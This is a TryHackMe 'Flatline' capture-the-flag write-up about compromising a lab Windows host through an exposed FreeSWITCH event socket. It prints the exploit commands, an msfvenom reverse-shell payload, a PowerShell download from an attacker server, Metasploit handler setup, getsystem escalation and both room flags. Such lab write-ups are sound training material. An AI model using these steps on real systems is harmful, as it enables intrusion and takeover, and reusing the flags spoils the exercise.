# 🪟 TryHackMe — Flatline

> **Room:** Flatline  |  **Platform:** TryHackMe  |  **Focus:** Network Enumeration, FreeSWITCH, Remote Command Execution, Windows Enumeration, Meterpreter, Privilege Escalation

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-success?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Windows%20%7C%20RCE%20%7C%20Privilege%20Escalation-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-success?style=for-the-badge)


---

# 📌 Overview

The **Flatline** room demonstrates a Windows compromise through an exposed **FreeSWITCH mod_event_socket** service.

The attack begins with network enumeration, where port **8021** is identified as FreeSWITCH. A public command-execution exploit (`47799.py`) is then used against the service to execute commands remotely.

The initial command execution allows the attacker to enumerate the Windows system and retrieve the **user flag**. However, the **root flag** cannot be read directly through the command-execution primitive.

To obtain a more capable shell, a Windows Meterpreter payload is generated with `msfvenom`, transferred to the target using PowerShell, and executed through the vulnerable FreeSWITCH service. A Metasploit handler receives the Meterpreter session.

The Meterpreter session initially runs as the `Nekrotic` user. The built-in `getsystem` command then successfully obtains a **SYSTEM** session through Named Pipe Impersonation, allowing the root flag to be read.

---

# 🎯 Objectives

- Enumerate the target machine.
- Identify the exposed FreeSWITCH service.
- Identify the vulnerable service and exploit it.
- Obtain remote command execution.
- Enumerate the Windows filesystem.
- Capture the user flag.
- Generate a Windows Meterpreter payload.
- Transfer and execute the payload.
- Obtain a Meterpreter session.
- Escalate from `Nekrotic` to `NT AUTHORITY\SYSTEM`.
- Capture the root flag.


---

# 🔗 Attack Path

```text
Nmap Enumeration
       ↓
Port 8021 — FreeSWITCH mod_event_socket
       ↓
FreeSWITCH Command Execution
       ↓
47799.py
       ↓
Remote Command Execution
       ↓
Windows Enumeration
       ↓
Read user.txt
       ↓
Root.txt access denied
       ↓
Generate Meterpreter Payload
       ↓
Transfer shell.exe to Target
       ↓
Execute shell.exe
       ↓
Meterpreter Session
       ↓
Nekrotic
       ↓
getsystem
       ↓
NT AUTHORITY\SYSTEM
       ↓
Read root.txt
```

---

# 1. 🔎 Initial Nmap Enumeration

The first step was to identify the open ports and services running on the target.


```bash
nmap -sV -Pn <TARGET_IP>
```


<img width="780" height="219" alt="1" src="https://github.com/user-attachments/assets/a0f55925-9d25-46c3-b3bb-3c75b0a44c37" />

The scan identified two important open ports:
```
| Port |       Service    |            Description            |
|------|------------------|-----------------------------------|
| 3389 |    ms-wbt-server | Microsoft Terminal Services / RDP |
| 8021 | freeswitch-event |   FreeSWITCH `mod_event_socket`   |

```

The target was identified as a Windows machine.

The most interesting service was port **8021**, because it exposed the FreeSWITCH event socket remotely.

Since no credentials were available for RDP, the investigation focused on port 8021.

---

# 2. 🔍 Investigating FreeSWITCH

The service discovered on port 8021 was:

```text
FreeSWITCH mod_event_socket
```

FreeSWITCH's event socket provides an interface for sending commands to the FreeSWITCH service.

Searching for known vulnerabilities revealed a command-execution exploit for FreeSWITCH 1.10.1, commonly distributed as `47799.txt`.

The exploit is a Python script and can be used to execute commands on a vulnerable FreeSWITCH instance.

For a local Kali installation, the exploit can be obtained through Exploit-DB/SearchSploit:

```bash
searchsploit FreeSWITCH
```

The relevant entry is:

```text
FreeSWITCH 1.10.1 - Command Execution
```

The exploit can then be copied locally:

```bash
searchsploit -m 47799
```

If the downloaded file is named `47799.txt`, it can be renamed:

```bash
mv 47799.txt 47799.py
```

---

# 3. ⚡ Testing Remote Command Execution

The exploit was used to execute a Windows `dir` command against the target.

### Command

```bash
python3 47799.py <TARGET_IP> 'dir'
```

<img width="575" height="672" alt="2" src="https://github.com/user-attachments/assets/29090b0a-fb10-444e-9894-814c8750cc4a" />

The response showed:

```text
Authenticated
```

followed by the contents of:

```text
C:\Program Files\FreeSWITCH
```

The directory contained FreeSWITCH components such as:

```text
FreeSwitch.dll
FreeSwitchConsole.exe
fs_cli.exe
htdocs
mod
conf
log
```

This confirmed that arbitrary Windows commands could be executed remotely through the vulnerable FreeSWITCH service.

---

# 4. 📁 Enumerating `C:\Users`

After confirming command execution, the next step was to enumerate the Windows users.

```bash
python3 47799.py <TARGET_IP> 'dir C:\Users'
```

<img width="488" height="306" alt="3" src="https://github.com/user-attachments/assets/3fd09f32-2aee-43f2-8f33-dfd692f01991" />

The output showed:

```text
Administrator
Nekrotic
Public
```

The user account:

```text
Nekrotic
```

was particularly interesting because the user's Desktop contained the flags.

---

# 5. 👤 Enumerating the `Nekrotic` Profile

The `Nekrotic` user's home directory was examined.

```bash
python3 47799.py <TARGET_IP> 'dir C:\Users\Nekrotic'
```

<img width="513" height="450" alt="4" src="https://github.com/user-attachments/assets/36dbc061-5c60-4cfe-9872-0aea52874ef0" />

The directory contained the standard Windows profile folders:

```text
Desktop
Documents
Downloads
Favorites
Links
Music
Pictures
Saved Games
Searches
Videos
```

The next location of interest was:

```text
C:\Users\Nekrotic\Desktop
```

---

# 6. 🚩 Finding the Flags

The Desktop directory was enumerated.

```bash
python3 47799.py <TARGET_IP> 'dir C:\Users\Nekrotic\Desktop'
```

<img width="557" height="281" alt="5" src="https://github.com/user-attachments/assets/38161d30-38a8-4ca5-b729-0203300579ed" />

The directory contained:

```text
root.txt
user.txt
```

Both flags were present, but they did not necessarily have the same access permissions.

---

# 7. 🧑‍💻 Capturing the User Flag

The `user.txt` file was read using the Windows `type` command.

```bash
python3 47799.py <TARGET_IP> 'type C:\Users\Nekrotic\Desktop\user.txt'
```

<img width="628" height="132" alt="6" src="https://github.com/user-attachments/assets/01038675-1040-4915-a2bb-262b0b842814" />

The user flag was:

```text
THM{64bca0843d535fa73eecd59d27cbe26}
```

---

# 8. 🔒 Attempting to Read `root.txt`

The same technique was used against the root flag.

```bash
python3 47799.py <TARGET_IP> 'type C:\Users\Nekrotic\Desktop\root.txt'
```

<img width="627" height="128" alt="7" src="https://github.com/user-attachments/assets/28f32e10-26ca-4286-a04e-1968e20e8d60" />

The response was:

```text
ERR no reply
```

The root flag could not be retrieved using the current command-execution method.

This indicated that a more capable shell and/or higher privileges were required.

---

# 9. 🧬 Generating a Meterpreter Payload

To obtain an interactive Meterpreter session, a Windows x64 reverse TCP executable was generated with `msfvenom`.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe > shell.exe
```

<img width="850" height="204" alt="8" src="https://github.com/user-attachments/assets/3fe84058-6cce-40dd-a31c-508375f4b167" />
The payload generated was:

```text
shell.exe
```

The output showed a final executable size of approximately 7680 bytes.

---

# 10. 📤 Transferring `shell.exe` to the Target

A Python HTTP server can be started from the directory containing `shell.exe`:

```bash
python3 -m http.server 8000
```

The target was then instructed to download the payload using PowerShell.

```bash
python3 47799.py <TARGET_IP> 'powershell Invoke-WebRequest -URI http://<KALI_IP>:8000/shell.exe -o C:\Users\Nekrotic\Desktop\shell.exe'
```

<img width="1191" height="458" alt="9" src="https://github.com/user-attachments/assets/b06e2097-a21b-4bb2-996d-19cf577b8f4d" />

The exploit returned:

```text
ERR no reply
```

However, the next directory listing confirmed that the file had been transferred successfully.

The Desktop listing showed:

```text
shell.exe
```

with a size of:

```text
7680 bytes
```

This confirmed that the payload was present on the target.

---

# 11. 🎧 Starting the Metasploit Handler

A Metasploit multi/handler was configured to receive the Meterpreter connection.

```text
use /multi/handler
set LHOST <KALI_IP>
set LPORT 443
set payload windows/x64/meterpreter/reverse_tcp
run
```

<img width="863" height="214" alt="10" src="https://github.com/user-attachments/assets/ca6d7f67-27f0-40cc-a1be-b1915578f72d" />

The handler started listening on:

```text
<KALI_IP>:443
```

The configured payload was:

```text
windows/x64/meterpreter/reverse_tcp
```

---

# 12. 🚀 Executing the Payload

The uploaded `shell.exe` was executed through the same FreeSWITCH command-execution vulnerability.

```bash
python3 47799.py <TARGET_IP> 'C:\Users\Nekrotic\Desktop\shell.exe'
```

<img width="597" height="54" alt="10-1" src="https://github.com/user-attachments/assets/2f1f49d7-c97f-4edc-b4de-95eb11018108" />

The exploit authenticated successfully.

Once the payload connected back to the waiting Metasploit handler, a Meterpreter session was established.

---

# 13. 🪪 Checking the Meterpreter User

The first step after receiving the Meterpreter session was to determine the current user.

```text
getuid
```

<img width="358" height="41" alt="11" src="https://github.com/user-attachments/assets/db8885e7-c903-442b-a171-bb12de8baac9" />

The result was:

```text
Server username: WIN-EOM4PK0578N\Nekrotic
```

Therefore, the Meterpreter session was running as:

```text
Nekrotic
```

This confirmed that the reverse shell had successfully moved from simple command execution to an interactive Meterpreter session.

---

# 14. 👑 Privilege Escalation with `getsystem`

The next step was to attempt privilege escalation.

Meterpreter provides the `getsystem` command for attempting to elevate privileges on Windows.

```text
getsystem
```

<img width="595" height="69" alt="12" src="https://github.com/user-attachments/assets/2a8db6b6-4d9b-4f89-b7b7-79f991db3f13" />

The result was:

```text
got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))
```

The current identity was then checked again:

```text
getuid
```

The result was:

```text
Server username: NT AUTHORITY\SYSTEM
```

The privilege escalation was successful.

The session had moved from:

```text
WIN-EOM4PK0578N\Nekrotic
```

to:

```text
NT AUTHORITY\SYSTEM
```

---

# 15. 🗂️ Navigating the Windows Filesystem

After obtaining SYSTEM privileges, the current directory was checked.

### Commands

```text
pwd
cd ..
cd ..
ls
```

<img width="684" height="388" alt="13" src="https://github.com/user-attachments/assets/1e062cbe-4671-4972-bc92-c7079465965f" />

The current location was initially:

```text
C:\Program Files\FreeSWITCH
```

The filesystem was then navigated back to:

```text
C:\
```

The root of the filesystem contained directories including:

```text
Program Files
ProgramData
Users
Windows
```

The `Users` directory was then selected.

---

# 16. 📂 Navigating to `Nekrotic`

The following commands were used:

```text
cd Users
ls
```

<img width="579" height="248" alt="14" src="https://github.com/user-attachments/assets/55dee822-dcf0-40b2-8f8a-e393de8a79c9" />

The `Nekrotic` user directory was present.

The session then navigated into it:

```text
cd Nekrotic
ls
```

<img width="657" height="610" alt="15" src="https://github.com/user-attachments/assets/c73cb553-26a7-4c48-82d6-0a5d1b702e04" />

The user's profile contained the Desktop directory.

The session then moved into:

```text
C:\Users\Nekrotic\Desktop
```

---

# 17. 👑 Capturing the Root Flag

The Desktop directory was listed after obtaining SYSTEM privileges.

```text
cd Desktop
ls
```

<img width="583" height="240" alt="16" src="https://github.com/user-attachments/assets/b8388b92-1bc0-453b-9e39-5459ed68bec5" />

The Desktop contained:

```text
desktop.ini
root.txt
shell.exe
user.txt
```

The root flag was then read:

```text
cat root.txt
```

The flag was:

```text
THM{8c8bc5558f0f3f8060d00ca231a9fb5e}
```
